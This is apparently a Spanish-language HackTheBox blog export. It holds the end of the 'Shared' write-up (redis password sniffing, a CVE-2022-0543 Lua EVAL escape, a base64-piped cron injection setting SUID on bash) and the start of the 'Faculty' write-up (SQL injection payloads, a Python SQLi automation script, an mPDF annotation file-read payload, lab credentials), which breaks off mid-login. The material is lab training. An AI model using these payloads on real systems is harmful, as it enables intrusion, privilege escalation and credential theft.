unos segundos, nos logeamos como dan_smith y conseguimos la flag:james_mason@shared:/tmp$ ./CVE-2022-21699.shLinux shared 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Tue Aug 16 03:19:09 2022 from 127.0.0.1dan_smith@shared:~$ whoamidan_smithdan_smith@shared:~$ find / -name user.txt 2&amp;gt;/dev/null | xargs ls -l-rw-r----- 1 root dan_smith 33 Aug 16 00:52 /home/dan_smith/user.txtPrivilege EscalationAl igual que con el usuario anterior, hacemos una enumeración básica de nuestro usuario y nos damos cuenta que pertenece al grupo 1003(sysadmin), entonces buscamos directorios y archivos con ese GUI (Group ID):dan_smith@shared:~$ iduid=1001(dan_smith) gid=1002(dan_smith) groups=1002(dan_smith),1001(developer),1003(sysadmin)dan_smith@shared:~$ find / -group 1003 2&amp;gt;/dev/null/usr/local/bin/redis_connector_devEn contramos el binario /usr/local/bin/redis_connector_dev, lo ejecutamos y nos muestra lo siguiente:dan_smith@shared:~$ /usr/local/bin/redis_connector_dev[+] Logging to redis instance using password...INFO command result:# Serverredis_version:6.0.15redis_git_sha1:00000000redis_git_dirty:0redis_build_id:4610f4c3acf7fb25redis_mode:standaloneos:Linux 5.10.0-16-amd64 x86_64arch_bits:64multiplexing_api:epollatomicvar_api:atomic-builtingcc_version:10.2.1process_id:27580run_id:52a282d2b4b882075ba776fde63771afa60e80cftcp_port:6379uptime_in_seconds:5uptime_in_days:0hz:10configured_hz:10lru_clock:16525803executable:/usr/bin/redis-serverconfig_file:/etc/redis/redis.confio_threads_active:0 &amp;lt;nil&amp;gt;Nos muestra un mensaje que se esta logeando a redis. Redis es un motor de base de datos en memoria que almacena la información de la forma clave-valorEntonces como nos muestra la versión intentamos encontrar algunar vulnerabilidades, encontramos varias, pero para poder ejecutarlas necesitabamos autenticarnos en la interfaz de redis con redis-cliNuestro objetivo ahora es lograr authenticarnos. Si nos fijamos bien, el binario anterior /usr/local/bin/redis_connector_dev nos muestra el mensaje [+] Logging to redis instance using password…. Al parecer al ejecutar el script, este se intenta conectar a redis y al entablar la conexión se autentica y recibimos ese output de informmación. ¿ Pero en qué puerto ?, sencillo, el puerto por defecto de redis es el 6379 Listamos los puertosdan_smith@shared:~$ netstat -tulnp(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.)Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:443 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:6379 &amp;lt;- Here! 0.0.0.0:* LISTEN - tcp6 0 0 :::22 :::* LISTEN - udp 0 0 0.0.0.0:68 0.0.0.0:* - Encontramos que está en escucha pero solo de manera local (127.0.0.1 loopback addres). Entonces como no podemos interceptar el binario de manera externa, por ello pasamos el binario a nuestra máquina y lo ejecutamos:❯ chmod +x redis_connector_dev❯ ./redis_connector_dev[+] Logging to redis instance using password...INFO command result: dial tcp 127.0.0.1:6379: connect: connection refused─────────────────────────────────────────────────────────────────────Al ejecutarlo nos sale un error de conexión rechazada sobre 127.0.0.1:6379, lo que pasa es que el binario está intentando ingresar a redis por el puerto 6379Entonces lo que hacemos es abrir el puerto 6379 para esperar esa conexión y recibir la contraseña de la autenticación:❯ chmod +x redis_connector_dev❯ ./redis_connector_dev[+] Logging to redis instance using password...INFO command result: dial tcp 127.0.0.1:6379: connect: connection refused &amp;lt;------- Connection failed (1)❯ ./redis_connector_dev[+] Logging to redis instance using password... &amp;lt;------- Successfull connection (3)INFO command result: i/o timeout──────────────────────────────────────────────────────────────────────────────────────────❯ nc -lvnp 6379 &amp;lt;-------- Open port (2)Ncat: Version 7.92 ( https://nmap.org/ncat )Ncat: Listening on :::6379Ncat: Listening on 0.0.0.0:6379Ncat: Connection from 127.0.0.1.Ncat: Connection from 127.0.0.1:51178.*2$4auth$16F2WHqJUz2WEz=Gqq &amp;lt;------- PasswordAl conectarnos vemos varios simbolos, pues esto se debe a que los clientes redis usan el protocolo RESP(REdis Serialization Protocol) para comunicarse con el servidor. Cuando se realiza la petición, estos datos se trasmiten como un arreglo de strings, aquí la explicación de los símbolos: Más informacions sobre RESP protocolComo ya tenemos una autenticación exitosa, ahora toca intentar explotar distintas vulnerabilidades que existen para redisUsamos como fuente la biblia de los Hacker Hacktricks, en mi caso solo me funcionó usar la forma Lua sandbox byass, especificamente CVE-2022-0543 que consiste en poder insertar código Lua (lenguaje que aporta al funcionamiento de Redis) a traves del comando EVAL y con ello ejecutar código remotoAntes tenemos que verificar que este proceso está siendo ejecutado como el usuario privilegiado, así que listamos rápidamente los procesos del sistema y confirmamos que el usuario root es quien está iniciando el servidor redis:dan_smith@shared:/tmp$ ps aux...root 30024 0.2 0.7 65104 14664 ? Ssl 21:13 0:00 /usr/bin/redis-server 127.0.0.1:6379 &amp;lt;----- Rootdan_smi+ 30030 0.0 0.1 9700 3192 pts/2 R+ 21:13 0:00 ps auxAhora procedemos a la explotación: Código lua que useremos# Guardamos en una variable el nombre de inicialización del paquete Lua que usaremoslocal io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); # Inicializamos el paquete guardándolo en una variablelocal io = io_l();# Accedemos a la función &#39;popen&#39; que nos permite ejecutar comandos {command} mostrando como output un archivolocal f = io.popen(&quot;{command}&quot;, &quot;r&quot;); # Leemos el archivo y guardamos su contenidolocal res = f:read(&quot;*a&quot;); # Cerramos el archivof:close(); # Retornamos la salida del comandoreturn res Entramos a la interfaz de redis redis-cli y usando el comando EVAL ejecutamos el script anterior con el comando whoami:dan_smith@shared:/tmp$ redis-cli -a F2WHqJUz2WEz=GqqWarning: Using a password with &#39;-a&#39; or &#39;-u&#39; option on the command line interface may not be safe.127.0.0.1:6379&amp;gt; EVAL &#39;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;whoami&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#39; 0&quot;root\\n&quot;127.0.0.1:6379&amp;gt; El ‘0’ del final indica que no pasamos ningún argumento al scriptConseguimos ejecutar comandos como el usuario root, ahora tenemos que buscar una manera ganar acceso completo a una shell Intentamos asignarle permisos SUID a la bash pero no logramos que funcione127.0.0.1:6379&amp;gt; EVAL &#39;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;chmod u+s /bin/bash&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#39; 0&quot;&quot;127.0.0.1:6379&amp;gt; EVAL &#39;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;ls -l /bin/bash&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#39; 0&quot;-rwxr-xr-x 1 root root 1234376 Mar 27 14:40 /bin/bash\\n&quot;Pero existe otra alternativa, al listar lo procesos del sistema con la herramienta pspy encontramos que el usuario root ejecuta el siguiente script:2022/08/16 22:44:01 CMD: UID=0 PID=32279 | /bin/bash /root/c.sh 2022/08/16 22:44:01 CMD: UID=0 PID=32280 | sleep 5 2022/08/16 22:44:01 CMD: UID=1001 PID=32281 | /usr/bin/python3 /usr/local/bin/ipython 2022/08/16 22:44:06 CMD: UID=0 PID=32283 | rm -rf /opt/scripts_review/* 2022/08/16 22:44:06 CMD: UID=0 PID=32286 | perl -ne s/\\((\\d+)\\)/print &quot; $1&quot;/ge 2022/08/16 22:44:06 CMD: UID=0 PID=32285 | /bin/bash /root/c.sh 2022/08/16 22:44:06 CMD: UID=0 PID=32284 | /bin/bash /root/c.shObservamos varios veces la ejecución del script c.sh, el cuál es una tarea cron que se ejecutará cada cierto tiempo. Entonces aplicamos lo mismo que antes y agregamos con el operador &amp;gt;&amp;gt; el comando chmod u+s /bin/bash: Para evitar problemas de sintáxis con los simbolos codificamos el comando en base64❯ echo &quot;echo &#39;chmod u+s /bin/bash&#39; &amp;gt;&amp;gt; /root/c.sh&quot; | base64ZWNobyAnY2htb2QgdStzIC9iaW4vYmFzaCcgPj4gL3Jvb3QvYy5zaAo=Ahora pasamos la cadena y lo decodificamos de vuelta para luego interpretarla con bash:127.0.0.1:6379&amp;gt; EVAL &#39;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;ls -l /bin/bash&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#39; 0&quot;-rwxr-xr-x 1 root root 1234376 Mar 27 14:40 /bin/bash\\n&quot;127.0.0.1:6379&amp;gt; EVAL &#39;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;echo ZWNobyAnY2htb2QgdStzIC9iaW4vYmFzaCcgPj4gL3Jvb3QvYy5zaAo= | base64 -d | bash&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#39; 0&quot;&quot;Por último esperamos unos segundos, volvemos a listar la bash, y ya tendremos asignado el permiso SUID. Así que lo ejecutamos como el propietario bash -p, conseguimos el acceso y la flag:127.0.0.1:6379&amp;gt; EVAL &#39;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;echo ZWNobyAnY2htb2QgdStzIC9iaW4vYmFzaCcgPj4gL3Jvb3QvYy5zaAo= | base64 -d | bash&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#39; 0&quot;&quot;127.0.0.1:6379&amp;gt; EVAL &#39;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;ls -l /bin/bash&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#39; 0&quot;-rwsr-xr-x 1 root root 1234376 Mar 27 14:40 /bin/bash\\n&quot;127.0.0.1:6379&amp;gt; exitdan_smith@shared:/tmp$ bash -pbash-5.1# whoamirootbash-5.1# find / -name root.txt | xargs ls -l-rw-r----- 1 root root 33 Aug 16 09:09 /root/root.txt Existe un exploit para la vulnerabilidad en cuestión CVE-2022-0543, el problema es que nos está el modulo redis instalado en la máquina. Así que si lo quieres probar puedes user la herramienta chisel para redirigir el puerto de redis(6379) a tú máquina y con ello explotar la vulnerabilidad con los modulos correctamente instaladosNo olvides que al usar el exploit del CVE tienes que agregar al objeto redis la contraseña con la parámetro password Aquí puedes descargar Chisel y el exploit CVE-2022-0543" }, { "title": "Hackthebox Writeup Faculty", "url": "/posts/HTBFaculty/", "categories": "HTB, Writeups", "tags": "HTB, Linux, Medium, Python Scripting, SQLI, XSS, mPDF, meta-git, GDB", "date": "2022-08-04 17:15:18 -0500", "snippet": "Overview: Database enumeration and bypass login page by SQL Inyection System users, system files, ssh credentials by Server Side XSS (Dynamic PDF) Meta plugin meta-git Remote code execution (foothold) Privileged process debugging with GDB system function call (privilege escalation) OS IP Release Date Difficulty Points Linux 10.10.11.169 02 Jul 2022 Medium 30 Antes de empezar verificamos que estamos conectado a la VPN de HTB y tenemos conexión con la máquina:&amp;gt; ping -c1 10.10.11.169PING 10.10.11.169 (10.10.11.169) 56(84) bytes of data.64 bytes from 10.10.11.169: icmp_seq=1 ttl=63 time=107 ms \\______________________ Linux Machine--- 10.10.11.169 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0ms \\_________________\\____________________________________ Successful connectionrtt min/avg/max/mdev = 106.595/106.595/106.595/0.000 ms Explicación de parámetros: -c &amp;lt;count&amp;gt; : Número de paquetes ICMP que deseamos enviar a la máquinaEnumerationCon nmap realizamos un escaneo de tipo TCP (Transfer Control Protocol) para descubrir puertos abiertos:❯ nmap -p- -sS --min-rate 5000 -n -Pn 10.10.11.169Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-04 17:26 -05Nmap scan report for 10.10.11.169Host is up (0.11s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh \\___________________ Secure Shel Protocol80/tcp open http \\___________________ Hypertext Transfer Protocol Explicación de parámetros : -p- : Escanear todos los puertos, del 1 al 65,535 -sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo --min-rate &amp;lt;number&amp;gt; : Enviar una taza (&amp;lt;number&amp;gt;) de paquetes por segundo como mínimo -n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS) -Pn : Omitir el descubrimiento de hosts y continuar con el escaneo de puertos, incrementa velocidad del escaneoAhora realizamos un escaneo a profundidad de los puertos 22(SSH) - 80(HTTP):❯ nmap -p22,80 -sCV 10.10.11.160 -oN openPortsTCPStarting Nmap 7.92 ( https://nmap.org ) at 2022-08-04 17:32 -05Nmap scan report for 10.10.11.160Host is up (0.11s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)| 256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)|_ 256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)80/tcp closed httpService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Explicación de parámetros : -p &amp;lt;port_1,port_2,...&amp;gt; : Indicamos que puertos queremos escanear -sCV (Fusión de parámetros -sC -sV) -sC : Ejecutar en los puertos scripts por defecto de nmap -sV : Activar detección de versiones de los servicios que corren por los puertos -oN &amp;lt;file&amp;gt; : Guardar el output del escaneo en un archivo con formato NmapAl empezar por el servicio web 80(HTTP) y buscar que tecnologías usa, nos damos cuenta que existe una redirección a faculty.htb: Usando nc❯ nc 10.10.11.169 80 -vNcat: Version 7.92 ( https://nmap.org/ncat )Ncat: Connected to 10.10.11.169:80.GET / HTTP/1.0HTTP/1.1 302 Moved TemporarilyServer: nginx/1.18.0 (Ubuntu)Date: Thu, 04 Aug 2022 22:46:25 GMTContent-Type: text/htmlContent-Length: 154Connection: closeLocation: http://faculty.htb &amp;lt;--------- Redirection&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;302 Found&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;302 Found&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;hr&amp;gt;&amp;lt;center&amp;gt;nginx/1.18.0 (Ubuntu)&amp;lt;/center&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt; Con curl❯ curl -I http://10.10.11.169HTTP/1.1 302 Moved TemporarilyServer: nginx/1.18.0 (Ubuntu)Date: Thu, 04 Aug 2022 22:43:11 GMTContent-Type: text/htmlContent-Length: 154Connection: keep-aliveLocation: http://faculty.htb &amp;lt;------- Redirection Con whatweb❯ whatweb http://10.10.11.169http://10.10.11.169 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.169], RedirectLocation[http://faculty.htb], Title[302 Found], nginx[1.18.0]ERROR Opening: http://faculty.htb - no address for faculty.htb &amp;lt;------- RedirectionEntonces confirmamos que se aplica Virtual Hosting y por ello lo agregamos a nuestro archivo, encargado de la resolución rápida de direcciones IP y nombres de dominio, /etc/hosts : echo &quot;10.10.11.169 faculty.htb&quot; &amp;gt;&amp;gt; /etc/hostsAhora si procedemos a buscar las tecnologías que corren por detrás usando whatweb:❯ whatweb http://10.10.11.169http://10.10.11.169 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.169], RedirectLocation[http://faculty.htb], Title[302 Found], nginx[1.18.0]http://faculty.htb [302 Found] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.169], JQuery, RedirectLocation[login.php], Script[text/javascript], Title[School Faculty Scheduling System], nginx[1.18.0]http://faculty.htb/login.php [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.169], JQuery, Script[text/javascript], Title[School Faculty Scheduling System], nginx[1.18.0] Si quieres una opción gráfica puedes usar en tu navegador la extensión Wappalyzer y ver las tecnologíasObservamos que tiene como servidor web una version estable de Nginx (version hasta la fecha de hoy: 1.19), como sistema operativo un Ubuntu, entre otros. Lo mas interesante es que hay otra redirección a la ruta login.php: Ingresando con Firefox:FootholdNos encontramos en una especie de sistema virtual de una facultad y nos pide ingresar nuestro Número de Identificación, al no tener uno empezamos probando una inyección básica de SQL &#39; or 1=1-- - y logramos entrar como el usuario Smith Jhon C pero sin poder hacer muchoPara observar de una mejor manera la respuesta a este panel de identificación y la inyección SQL, procedemos a interceptar la petición con burpsuiteIngresando como input una comilla simple &#39; logramos generar un error y la ruta absoluta de un archivo PHP:Ahora que obtenemos una respuesta de error podemos listar las bases de datos que existan y sus respectivas tablas y columnas: Primero tenemos que hallar el número de columnas de la tabla actual en la que se están seleccionando los datosLa palabra clave o comando order by ordena el conjunto de resultados de la consulta (asc. o desc.) y nos sirve para hallar el número de columnas. Veamos un ejemplo:MariaDB [test_db]&amp;gt; select * from Accounts;+----------+----------+-------------------+| Username | Password | Email |+----------+----------+-------------------+| admin | HxZsO9AR | admin@site.com || staff | ihKdNTU4 | staff@site.com || user | Iwsi7Ks8 | usr@othersite.com |+----------+----------+-------------------+MariaDB [test_db]&amp;gt; select * from Accounts where Username = &#39;&#39; order by 1;Empty set (0.000 sec)MariaDB [test_db]&amp;gt; select * from Accounts where Username = &#39;&#39; order by 2;Empty set (0.001 sec)MariaDB [test_db]&amp;gt; select * from Accounts where Username = &#39;&#39; order by 3;Empty set (0.001 sec)MariaDB [test_db]&amp;gt; select * from Accounts where Username = &#39;&#39; order by 4;ERROR 1054 (42S22): Unknown column &#39;4&#39; in &#39;order clause&#39; &amp;lt;------------------ Number of columns = 3 (4 - 1) Tambien puede usarse la palabra clave group by, ambos funcionan igual para este propósito Ahora tenemos que hacer una selección con el número de columnas de la tabla para poder usar cualquiera de sus camposPara ello usamos la palabra clave union que nos permite unir varias selecciones de distintas tablas en una sola. Veamos el ejemplo:MariaDB [test_db]&amp;gt; select * from Accounts where Username = &#39;&#39; union select 1,2,3;+----------+----------+-------+| Username | Password | Email |+----------+----------+-------+| 1 | 2 | 3 |+----------+----------+-------+ Ahora que ya tenemos acceso a los campos, usamos la función group_concat() para poder extraer los nombres de bases de datos, columnas, etcLa función group_concat() nos ayuda a concatenar datos de múltiples filas en un solo campo. Veamos un ejemplo:MariaDB [test_db]&amp;gt; select * from Accounts where Username = &#39;&#39; union select 1,2,group_concat(0x7c, user(), 0x7c, database(), 0x7c);+----------+----------+--------------------------+| Username | Password | Email |+----------+----------+--------------------------+| 1 | 2 | |root@localhost|test_db| |+----------+----------+--------------------------+Finalmente ahora podemos extraer diversa información como:--Database names&#39; union select 1,2,group_concat(0x7c,schema_name,0x7c) from information_schema.schemata--Tables of a database&#39; union select 1,2,3,group_concat(0x7c,table_name,0x7C) from information_schema.tables where table_schema=[database]--Column names&#39; union select 1,2,3,group_concat(0x7c,column_name,0x7C) from information_schema.columns where table_name=[table name] Esta y más información lo encuentras en HacktricksEl único problema era que teniamos que ir probando cada query en la página login.php y es tedioso, por ello hice un script en python para automatizar gran proceso:import signal, sys, argparse, requests, subprocess, base64# debuggingimport pdb# ctrl+Cdef signal_handler(): print(&quot;[-] Interruption&quot;); sys.exit()signal.signal(signal.SIGINT, signal_handler)# global variablestarget_url = &#39;http://faculty.htb&#39;# argumentsparser = argparse.ArgumentParser(description=&#39;SQL Inyection&#39;)parser.add_argument(&#39;-d&#39;, &#39;--database&#39;, type=str, required=False, help=&#39;Select database&#39;)parser.add_argument(&#39;-t&#39;, &#39;--table&#39;, type=str, required=False, help=&#39;Select table&#39;)parser.add_argument(&#39;-c&#39;, &#39;--column&#39;, type=str, required=False, help=&#39;Select column&#39;)parser.add_argument(&#39;-q&#39;, &#39;--query&#39;, type=str, required=False, help=&#39;One word query (g.e version())&#39;)args = parser.parse_args()# query modesdef get_databases(): return &quot;&quot;&quot;&#39; union select 1,2,3,4,5,6,7,8,9,group_concat(0x7c, schema_name, 0x7c) from information_schema.schemata-- -&quot;&quot;&quot;def get_tables(database): return &quot;&quot;&quot;&#39; union select 1,2,3,4,5,6,7,8,9,group_concat(0x7c, table_name, 0x7c) from information_schema.tables where table_schema = &quot;{}&quot;-- -&quot;&quot;&quot;.format(database)def get_columns(table): return &quot;&quot;&quot;&#39; union select 1,2,3,4,5,6,7,8,9,group_concat(0x7c, column_name, 0x7c) from information_schema.columns where table_name = &quot;{}&quot;-- -&quot;&quot;&quot;.format(table)def get_fields(column, table): return &quot;&quot;&quot;&#39; union select 1,2,3,4,5,6,7,8,9,group_concat(0x7c, {}, 0x7c) from {}-- -&quot;&quot;&quot;.format(column, table) def get_info(command): return &quot;&quot;&quot;&#39; union select 1,2,3,4,5,6,7,8,9,group_concat(0x7c, {}, 0x7c)-- -&quot;&quot;&quot;.format(command) # optionsdef options(): try: if len(sys.argv) == 1: return get_databases() elif args.database and args.table and args.column: return get_fields(args.column, args.table) elif args.database and args.table: return get_columns(args.table) elif args.database: return get_tables(args.database) elif args.query: return get_info(args.query) except Exception as e: print(e)# requestdef inyection(): # create session s = requests.Session() headers = {&#39;Content-Type&#39; : &#39;application/x-www-form-urlencoded; charset=UTF-8&#39;} # set option inyection = options() # inyection data = dict(id_no=inyection) target = target_url + &#39;/admin/ajax.php?action=login_faculty&#39; r = s.post(target, headers=headers, data=data) target = target_url + &#39;/index.php&#39; r = s.get(target, cookies=r.cookies.get_dict()) content = r.text # encode b64 msg_b = content.encode(&#39;ascii&#39;) base64_b = base64.b64encode(msg_b) base64_m = base64_b.decode(&#39;ascii&#39;) # filter content command = f&quot;&quot;&quot;echo {base64_m} | base64 -d&quot;&quot;&quot; + &quot;&quot;&quot; | grep -E &quot;&amp;lt;a&quot; | head -n 1 | awk -F&#39;&amp;gt;&#39; &#39;{print $2}&#39; | awk &#39;{print $1}&#39;&quot;&quot;&quot; output = subprocess.run(command, shell=True, capture_output=True, text=True) print() print(output.stdout) if __name__ == &#39;__main__&#39;: inyection() Puedes encontrar el script en mi repositorio https://github.com/E1P0TR0Después de enumerar las diversas tablas solo encontramos un hash del usuario Admin que no podremos crackear, a pesar de eso me gustó el scripting de la inyección a manera de prácticaAlgo que si nos puede ser útil es la ruta que encontramos al encontrar el error de la inyección: /var/www/scheduling/admin/admin_class.phpComo usuarios de Linux sabemos que al montar un servidor web todos los archivos o documentos serán almacenados en la ruta /var/www/html y podemos tener múltiples sitios web con una misma dirección IP, ya sea con apache (virtual hosts) o nginx (server blocks), y sus diferentes directorios de la webCon lo anterior llegamos a la conclusión que /var/www/scheduling (nombre que tiene relación con la web) sea un server block de nginx y /admin una posible ruta con sus respectivos archivos. Así que ingresamos a la ruta http://faculty.htb/admin y nos redirigimos a otro panel login.php: También podemos realizar Fuzzing de directorios con gobuster dir para encontrar dicha rutaEjecutando es script anterior encontramos que en la base de datos existía una tabla users y con solo un único usuario admin, pero no sin poder crackear la contraseña:❯ python3 ../scripts/sql_inyection.py -d scheduling_db -t users|id|,|name|,|password|,|type|,|username|❯ python3 ../scripts/sql_inyection.py -d scheduling_db -t users -c username|admin|❯ python3 ../scripts/sql_inyection.py -d scheduling_db -t users -c password|1fecbe762af147c1176a0fc2c722a345|A pesar de eso, es probable que este panel de login también sea vulnerable a SQL Inyection, ya que ambas forman parte de la misma web y probablemente apliquen las mismas prácticas para la validación de datos en la consulta a su base de datosEstamos en lo correcto y logramos entrar como el usuario que antes habiamos validado en la table users:Ya dentro encontramos la relación del panel de la izquierda con las tablas de la base de datos scheduling_db que vimos anteriormenteDespués de toquetear la página, encontramos que todos los campos de entrada para el usuario son vulnerables a XSS (Cross Site Scripting), pero no conseguimos explotarla del todo:Lo que llama la atención es que en la mayoría de secciones podemos convertir la tabla de datos en pdf y con ello ver información interesante: Al convertir se nos abre una nueva pestaña con una ruta interesante: http://faculty.htb/mpdf/tmp/OKi3s9CQdwfjGag64Ju5ZO0NpF.pdf También al abrir las herramientas de desarrollador observamos el mensaje en consola: PDF da3749fcbe722bed51f217ce14055d41 [1.4 mPDF 6.0 / -] (PDF.js: 2.12.70)Además podemos ver su código que lo ejecuta en el archivo viewer.js//...async _initializeMetadata(pdfDocument) { const { info, metadata, contentDispositionFilename, contentLength } = await pdfDocument.getMetadata(); if (pdfDocument !== this.pdfDocument) { return; } this.documentInfo = info; this.metadata = metadata; this._contentDispositionFilename ??= contentDispositionFilename; this._contentLength ??= contentLength; console.log(`PDF ${pdfDocument.fingerprints[0]} [${info.PDFFormatVersion} ` + `${(info.Producer || &quot;-&quot;).trim()} / ${(info.Creator || &quot;-&quot;).trim()}] ` + `(PDF.js: ${_pdfjsLib.version || &quot;-&quot;})`); // This!//...} Y finalmente al descargar el pdf y abrirlo, en sus propiedades podemos ver la herramienta que se encargaría de generar el archivo:Buscando en internet encontramos que mpdf es una librería en PHP que permite generar archivos pdf usando html, además que su versión hasta la fecha es mpdf 8.1.0 y la que usa es servidor la mpdf 6.0, por lo cuál está muy desactualizada y es probable que sea vulnerableEncontramos en la página Hacktricks una posible brecha de Server Side XSS, lo cúal ya descubrimos anteriormente que la web era vulnerable a XSS (Cross Site Scripting)Depués de intentar con varios tags para leer archivos locales, encontramos que &amp;lt;annotation&amp;gt; es vulnerable, pero que nos permite este tag?Como su mismo nombre lo dice nos permite realizar anotaciones en nuestro documento pdf, como las nostas Post-it que las personas usanAhora analizemos los parámetros que usamos para la inyección:&amp;lt;annotation file=&quot;/etc/passwd&quot; content=&quot;/etc/passwd&quot; icon=&quot;Graph&quot; title=&quot;Attached File: /etc/passwd&quot; pos-x=&quot;195&quot; /&amp;gt; Parameters file : Ruta del archivo para adjuntar en el pdf (importante) content : Texto emergente al pasar el cursor por el documento (importante para poder luego descargar el archivo) icon : Apariencia del marcador de anotación (no necesario) tittle : Agregar un titulo a la nota (solo necesario para mejor visualización) pos-x : Posición de la nota (tener en cuenta que se encuentre en el limite del tamaño de tu archivo para poder visualizarlo, de igual manera estará adjunto al documento) En cualquier caso no puedas ver el archivo en la web, ten en cuenta que ya es parte del archivo y puedes extraerlo con la herramienta pdftk❯ apt install pdftk❯ pdftk OKbvFO0p8W9ud7qtnTzHJsfZhr.pdf unpack_files❯ ls OKbvFO0p8W9ud7qtnTzHJsfZhr.pdf  passwd Más información del tag &amp;lt;annotation&amp;gt; https://mpdf.github.io Aquí puedes encontrar el repositorio de la vulnerabilidad exacta https://github.com/mpdfAhora que podemos leer archivos del sistema y tenemos el archivo /etc/passwd, podemos ver los usuarios existentes:❯ cat passwd | grep bashroot:x:0:0:root:/root:/bin/bashgbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bashdeveloper:x:1001:1002:,,,:/home/developer:/bin/bashIntentamos leer llaves privadas RSA pero no conseguimos nada. Entonces recordamos el archivo que encontramos antes al generar el error en la inyección SQL (/var/www/scheduling/admin/admin_class.php), lo extraemos y vemos su contenido:&amp;lt;?phpsession_start();ini_set(&#39;display_errors&#39;, 1);Class Action { private $db; public function __construct() { ob_start(); include &#39;db_connect.php&#39;; // File in the same directory $this-&amp;gt;db = $conn; } function __destruct() { $this-&amp;gt;db-&amp;gt;close(); ob_end_flush(); }//... Encontramos las funciones y queries vulnerables a la Inyección SQL y nos demos cuenta que el problema es el mal uso de concatenación de cadenas (“.” para php)Lo que sí de ve interesante es que incluyen el archivo db_connect.php, que por su nombre podemos encontrar cosas interesantes de la base de datos, así que de la misma manera descargamos el archivo:&amp;lt;?php $conn= new mysqli(&#39;localhost&#39;,&#39;sched&#39;,&#39;Co.met06aci.dly53ro.per&#39;,&#39;scheduling_db&#39;)or die(&quot;Could not connect to mysql&quot;.mysqli_error($con)); // Credentials!Logramos encontrar unas credenciales, pero en nuestro escaneo de puertos la máquina no tenia el puerto por defecto de Mysql 3306 así que no podemos conectarnos. Pero ya que son credenciales podemos rehusarlas e ingresar como los usuarios disponibles del sistema que vimos en el archivo /etc/passwd y tienen una bash: root, gbyolo, developerAl final logramos entrar como el usuario gbyolo pero no tenemos permisos aún para ver la flag:❯ ssh gbyolo@10.10.11.169gbyolo@10.10.11.169&#39;s password: Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Fri Aug 5 20:20:15 CEST 2022 System load: 0.0 Processes: 226 Usage of /: 74.9% of 